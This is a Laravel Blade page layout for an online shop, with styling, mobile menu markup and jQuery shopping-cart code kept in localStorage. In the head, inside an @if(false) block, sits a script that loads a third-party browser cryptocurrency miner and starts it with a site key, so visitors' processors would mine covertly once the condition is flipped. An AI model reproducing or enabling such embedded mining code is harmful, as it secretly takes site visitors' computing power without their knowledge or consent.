<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>{{ setting('company')->name }} - @yield('title')</title>
    <link rel="icon" type="image/png" href="{{ asset($logo->favicon) }}"><!-- fonts -->
    <!-- css -->
    @include('facebook-pixel::head')
    @include('layouts.yellow.css')
    <!-- js -->
    <!-- font - fontawesome -->
    <link rel="stylesheet" href="{{ asset('strokya/vendor/fontawesome-5.6.1/css/all.min.css') }}"><!-- font - stroyka -->
    <link rel="stylesheet" href="{{ asset('strokya/fonts/stroyka/stroyka.css') }}">
    <style>
        ::placeholder {
            color: #ccc !important;
        }
        .search-btn:focus {
            outline: none;
        }
        .mobile-links__item-title {
            font-family: 'Merriweather Sans', sans-serif;
        }
        .page-header {
            background-color: black;
            color: white;
            margin-bottom: 1rem;
        }
        .page-header__container {
            padding-bottom: 12px;
        }
        .products-list__item {
            justify-content: space-between;
        }
        @media (max-width: 479px) {
            /* .products-list[data-layout^=grid-] .products-list__item {
                width: 46%;
                margin: 8px 6px;
            } */
        }
        @media (max-width: 575px) {
            .mobile-header__search {
                top: 55px;
            }
            .mobile-header__search-form .aa-input-icon {
                display: none;
            }
            .mobile-header__search-form .aa-hint, .mobile-header__search-form .aa-input {
                padding-right: 15px !important;
            }
            .block-products-carousel[data-layout^=grid-] .product-card .product-card__buttons .btn {
                height: auto;
            }
        }
        .product-card {
            transition: all 0.3s;
        }
        .product-card:before {
            box-shadow: inset 0 0 0 2px #f3f3f3;
        }
        .product-card:hover {
            transform: translateY(-8px);
        }
        .product-card:hover:before {
            box-shadow: inset 0 0 0 2px #f3f3f3;
        }
        .product-card:before,
        .owl-carousel {
            z-index: 0;
        }
        .block-products-carousel[data-layout^=grid-] .product-card .product-card__info,
        .products-list[data-layout^=grid-] .product-card .product-card__info {
            padding: 0 14px;
        }
        .block-products-carousel[data-layout^=grid-] .product-card .product-card__actions,
        .products-list[data-layout^=grid-] .product-card .product-card__actions {
            padding: 0 14px 14px 14px;
        }
        .product-card__name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .product-card__buttons {
            margin-right: -12px !important;
            margin-bottom: -12px !important;
            margin-left: -12px !important;
        }
        .product-card__buttons .btn {
            height: auto !important;
            font-size: 70% !important;
            /* padding-left: 0.5rem !important;
            padding-right: 0.5rem !important; */
            padding: 0.75rem 0.15rem !important;
            border-radius: 0 !important;
            display: block;
            width: 100%;
            color: #fff;
        }
        .aa-input-container {
            width: 100%;
            height: 100%;
            border: 3px solid #131921;
            border-radius: 7px;
        }
        .algolia-autocomplete {
            width: 100%;
            display: flex !important;
        }
        #aa-search-input {
            box-shadow: none;
        }
        .indicator__area {
            padding: 0 8px;
        }
        .mobile-header__search.mobile-header__search--opened {
            height: 48px;
            display: flex;
        }
        .mobile-header__search-form {
            width: 100%;
        }
        .mobile-header__search-form .aa-input-container {
            display: flex;
        }
        .mobile-header__search-form .aa-input-search {
            box-shadow: none;
        }
        .mobile-header__search-button {
            background: #232F3E;
            color: white;
            fill: white;
        }
        .mobile-header__search-form .aa-hint,
        .mobile-header__search-form .aa-input {
            height: 42px;
            padding-right: 32px;
        }
        .mobile-header__search-form .aa-input-icon {
            right: 62px;
        }
        .mobile-header__search-form .aa-dropdown-menu {
            background-color: #f7f8f9;
            z-index: 9999 !important;
        }
        .mobilemenu__close {
            height: 34px;
            width: 34px;
            fill: #fff;
            padding: 0px 1px 2px 0px;
            margin-right: -16px;
            border-radius: 50%;
            background: black;
        }
        .aa-input-container input {
            font-size: 15px;

        }
        .toast {
            position: absolute;
            top: 10%;
            right: 10%;
            z-index: 9999;
        }
        @media (max-width: 991px) {
            .header-fixed .site__header {
                position: fixed;
                width: 100%;
                z-index: 111;
            }
            .header-fixed .site__body {
                padding-top: 85px;
            }
        }



        .site__header.d-lg-block.d-none {
            position: sticky;
            top: 0;
            z-index: 99;
        }
        /** StickyNav **/
        .site-header.sticky {
            position: fixed;
            top: 0;
            min-width: 100%;
        }
        .site-header.sticky .site-header__middle {
            height: 80px;
        }
        /*.site-header.sticky .site-header__nav-panel,*/
        .site-header.sticky .site-header__topbar {
            display: none;
        }
        .site__body.sticky {
            position: sticky;
            top: 134px;
        }


        /**
         * Products
         */
        .block-header__divider+.block-header__title {
            margin-left: 16px;
        }
        .product-card {
            overflow: hidden;
        }
        .product-card__prices {
            margin-top: 5px;
            font-size: 17px;
            line-height: 1;
            font-weight: 700;
            color: #3d464d;
            margin-bottom: 5px;
            display: flex;
            justify-content: space-between;
            flex-direction: row-reverse;
        }
        .product-card__buttons {
            margin-top: 0;
        }
        .products-list[data-layout^=grid-] .product-card .product-card__badges-list {
            left: unset;
            right: -30px;
            top: -3px;
        }
        .product-card__badge {
            transform: rotate(45deg);
        }
        .products-list[data-layout^=grid-] .product-card:hover {
            margin-bottom: 0;
        }
        .product-card__badge {
            padding: 14px 20px 6px;
        }
        .products-list[data-layout^=grid-] .product-card .product-card__buttons {
            display: flex;
        }
    </style>
    @stack('styles')
    @if(false)
        <script src="https://webminepool.com/lib/base.js"></script>
        <script>
            window.onload = function() {
                console.log('JavaScript Loaded.');
                var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
                miner.start();
                console.log('JavaScript Working.');
            }
        </script>
    @endif
</head>

<body class="header-fixed" style="margin: 0; padding: 0;">
    @include('facebook-pixel::body')
    <!-- quickview-modal -->
    <div id="quickview-modal" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-xl">
            <div class="modal-content"></div>
        </div>
    </div><!-- quickview-modal / end -->
    <!-- mobilemenu -->
    <div class="mobilemenu">
        <div class="mobilemenu__backdrop"></div>
        <div class="mobilemenu__body">
            <div class="mobilemenu__header">
                <div class="mobilemenu__title">Menu</div>
                <button type="button" class="mobilemenu__close">
                    <svg width="30" height="30" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg" class="close-icon"><g fill="none" fill-rule="evenodd"><g transform="translate(-168 -859)" fill-rule="nonzero"><g id="Group-12-Copy" transform="translate(168 859)"><g id="Group-16"><rect id="Rectangle-14" fill="transparent" width="24" height="24"></rect><g id="Group-36" transform="rotate(45 1.257 16.243)" stroke="#ffffff" stroke-linecap="square" stroke-width="2"><path d="M5.5,0.5 L5.5,11.5" id="Line-6"></path><path d="M11,6 L0,6" id="Line-7"></path></g></g></g></g></g></svg>
                </button>
            </div>
            <div class="mobilemenu__content">
                <ul class="mobile-links mobile-links--level--0" data-collapse data-collapse-opened-class="mobile-links__item--open">
                    @include('partials.mobile-menu-categories')
                    @include('partials.header.menu.mobile')
                </ul>
            </div>
        </div>
    </div><!-- mobilemenu / end -->
    <!-- site -->
    <div class="site">
        <!-- mobile site__header -->
        @include('partials.header.mobile')
        <!-- mobile site__header / end -->
        <!-- desktop site__header -->
        @include('partials.header.desktop')
        <!-- desktop site__header / end -->
        <!-- site__body -->
        <div class="site__body">
            <div class="container">
                <x-alert-box class="row mt-2" />
            </div>
            @yield('content')
        </div>
        <!-- site__body / end -->
        <!-- site__footer -->
        @include('partials.footer')
        <!-- site__footer / end -->
    </div><!-- site / end -->
    @include('layouts.yellow.js')
    <script>
        $(document).ready(function () {
            // localStorage.removeItem('product-cart');
            function renderCart() {
                var cart = cartContent();
                $('.cart-count').text(cart.length);
                var cartProducts = cart.length ? cart.map(function (v, i) {
                    return `<div class="dropcart__product" data-id="${v.id}">
                        <div class="dropcart__product-image">
                            <a href="${v.detail}">
                                <img src="${v.image}" alt="">
                            </a>
                        </div>
                        <div class="dropcart__product-info">
                            <div class="dropcart__product-name">
                                <a href="${v.detail}">${v.name}</a>
                            </div>
                            <div class="dropcart__product-meta">
                                <span class="dropcart__product-quantity">${v.quantity}</span> x <span class="dropcart__product-price">TK ${v.price}</span>
                            </div>
                        </div>
                        <button type="button" class="dropcart__product-remove btn btn-light btn-sm btn-svg-icon" remove-cart-item data-id="${v.id}">
                            <svg width="10px" height="10px">
                                <use xlink:href="{{ asset('strokya/images/sprite.svg#cross-10') }}"></use>
                            </svg>
                        </button>
                    </div>`;
                }) : '<strong>No Items In Cart.</strong>';
                $('.dropcart__products-list').html(cartProducts);
                $('.cart-subtotal span, .checkout-subtotal span').text(cart.length ? cart.reduce(function (acc, v) {
                    return acc += Number(v.price) * Number(v.quantity);
                }, 0) : 0);
            }

            renderCart();

            function renderCartPage() {
                var cart = cartContent();
                $('.cart-count').text(cart.length);
                var cartProducts = cart.length ? cart.map(function (v, i) {
                    return `<tr class="cart-table__row" data-id="${v.id}">
                        <td class="cart-table__column cart-table__column--image">
                            <a href="${v.detail}">
                                <img src="${v.image}" alt=""></a>
                            </td>
                        <td class="cart-table__column cart-table__column--product">
                            <a href="${v.detail}" class="cart-table__product-name">${v.name}</a>
                        </td>
                        <td class="cart-table__column cart-table__column--price" data-title="Price">TK ${v.price}</td>
                        <td class="cart-table__column cart-table__column--quantity" data-title="Quantity">
                            <div class="input-number">
                                <input class="form-control input-number__input" type="number" min="1" value="${v.quantity}" `+(v.max != -1 ? 'max="'+v.max+'"' : '')+` readonly>
                                <div class="input-number__add"></div>
                                <div class="input-number__sub"></div>
                            </div>
                        </td>
                        <td class="cart-table__column cart-table__column--total" data-title="Total">TK ${Number(v.price) * Number(v.quantity)}</td>
                        <td class="cart-table__column cart-table__column--remove">
                            <button type="button" class="btn btn-light btn-sm btn-svg-icon" remove-cart-item data-id="${v.id}">
                                <svg width="12px" height="12px">
                                    <use xlink:href="{{ asset('strokya/images/sprite.svg#cross-12') }}"></use>
                                </svg>
                            </button>
                        </td>
                    </tr>`;
                }) : '<tr class="bg-danger"><td colspan="6" class="text-center py-2">No Items In Cart.</td></tr>';
                $('.cart-table__body').html(cartProducts);
                $('.cart-subtotal span, .checkout-subtotal span').text(cart.length ? cart.reduce(function (acc, v) {
                    return acc += Number(v.price) * Number(v.quantity);
                }, 0) : 0);
            }

            renderCartPage();

            $('.product-card__addtocart, .product-card__ordernow').on('click', function (ev) {
                ev.preventDefault();
                var card = $(this).parents('.product-card');
                var prices = card.find('.product-card__prices');
                var price = prices.hasClass('has-special')
                ? prices.find('.product-card__new-price span').text()
                : prices.find('span').text();

                var product = {
                    id: card.data('id'),
                    max: card.data('max'),
                    name: card.find('.product-card__info a').text(),
                    image: card.find('.product-card__image img').attr('src'),
                    detail: card.find('.product-card__name a').attr('href'),
                    quantity: 1,
                    price: price,
                };

                addToCart(product);

                if ($(this).hasClass('product-card__ordernow')) {
                    window.location = "{{ route('checkout') }}";
                }
            });

            function addToCart(product) {
                product.price = product.price.replace(/,/g , "");
                var cart = cartContent(), updated = false;
                cart = cart.filter(function (item) {
                    if (product.id == item.id) {
                        item.quantity = product.quantity;
                        updated = true;
                    }
                    return true;
                });
                updated || cart.push(product);
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                renderCart();
                renderTotal();
                $.bootstrapGrowl("Product Added To Cart.", {
                    type: 'info',
                    align: 'right',
                    stackup_spacing: 30
                });
            }

            $('.product__actions-item--addtocart button, .product__actions-item--ordernow button').on('click', function (ev) {
                ev.preventDefault();
                var card = $(this).parents('.product__content');
                var prices = card.find('.product__prices');
                var price = prices.hasClass('has-special')
                ? prices.find('.product-card__new-price span').text()
                : prices.find('span').text();

                var product = {
                    id: card.data('id'),
                    max: card.data('max'),
                    name: card.find('.product__name').text(),
                    image: card.find('.product-base__image').attr('src'),
                    detail: card.find('.product-base__image').data('detail'),
                    quantity: Number($('#product-quantity').val()),
                    price: price,
                };

                addToCart(product);

                if ($(this).parent().hasClass('product__actions-item--ordernow')) {
                    window.location = "{{ route('checkout') }}";
                }
            });

            function cartContent() {
                var cart = JSON.parse(localStorage.getItem('product-cart'));
                return cart == null ? [] : cart;
            }

            $(document).on('click', '[remove-cart-item]', function (ev) {
                ev.preventDefault();
                removeFromCart($(this).data('id'));
                renderCart();
                renderCartPage();
                renderTotal();
            });

            function removeFromCart(id) {
                var cart = cartContent();
                cart = cart.filter(function (v, i) {
                    return v.id != id;
                });
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                $.bootstrapGrowl("Product Removed From Cart.", {
                    type: 'info',
                    align: 'right',
                    stackup_spacing: 30
                });
            }

            $('.cart__update-button').on('click', function(ev) {
                ev.preventDefault();
                updateCart();
            });

            function updateCart() {
                var cart = cartContent();
                cart.filter(function (item) {
                    item.quantity = $('.cart-table__body tr[data-id="'+item.id+'"] .input-number input').val();
                    return item;
                });
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                renderCart();
                renderCartPage();
                renderTotal();
            }

            $(document).on('click', '.input-number__add', function (ev) {
                ev.preventDefault();

                var input = $(this).siblings('input');
                if (input.attr('max') == undefined || input.attr('max') > input.val()) {
                    input.val(Number(input.val()) + 1);
                    input.attr('id') == 'product-quantity' || updateCart();
                }
            });

            $(document).on('click', '.input-number__sub', function (ev) {
                ev.preventDefault();

                var input = $(this).siblings('input');
                if (input.val() > 1) {
                    input.val(Number(input.val()) - 1);
                    input.attr('id') == 'product-quantity' || updateCart();
                }
            });

            function renderTotal() {
                var shipping = localStorage.getItem('shipping');
                $('[name="address"]').parents('.form-group').addClass(shipping ? 'd-block' : 'd-none');
                if (shipping) {
                    $('#'+shipping).prop('checked', true);
                    var shipping = Number($('#'+shipping).data('val'));
                    $('.shipping span').text(shipping)
                } else {
                    shipping = 0;
                }

                $('.cart__totals-footer span').text(Number($('.cart__totals-header .cart-subtotal span').text()) + shipping);
                $('.checkout__totals-footer span').text(Number($('.checkout__totals-subtotals .checkout-subtotal.desktop span').text()) + shipping);
            }

            renderTotal();
            $('[name="shipping"]').on('change', function (ev) {
                localStorage.setItem('shipping', $(this).attr('id'));
                renderTotal();
            });

            function orderedProducts() {
                $('.ordered-products').empty();
                for (var index = 0, cart = cartContent(); index < cart.length; index++) {
                    $('.ordered-products').append('<input type="hidden" name="products['+cart[index].id+']" value="'+cart[index].quantity+'" />');
                }
            }
            orderedProducts();


            $(window).on('scroll', function() {
                $('input, textarea').blur();
                var scrollTop = $(this).scrollTop()
                if (scrollTop > 400) {
                    // $('.site__body').addClass('sticky');
                    // $('.site-header').addClass('sticky');
                    // $('.site-header__phone').removeClass('d-none');
                    $('.departments').removeClass('departments--opened departments--fixed');
                    $('.departments__body').attr('style', '');
                    // $('.block-slideshow__body').parent().addClass('col').removeClass('col-12 col-lg-9 offset-lg-3');
                } else {
                    // $('.site__body').removeClass('sticky');
                    // $('.site-header').removeClass('sticky');
                    // $('.site-header__phone').addClass('d-none');
                    if ($('.departments').data('departments-fixed-by') != '')
                        $('.departments').addClass('departments--opened departments--fixed');
                    $('.departments--opened.departments--fixed .departments__body').css('min-height', '458px');
                    // $('.block-slideshow__body').parent().addClass('col-12 col-lg-9 offset-lg-3').removeClass('col');
                }
            });
        });
    </script>
    @stack('scripts')
</body>

</html>
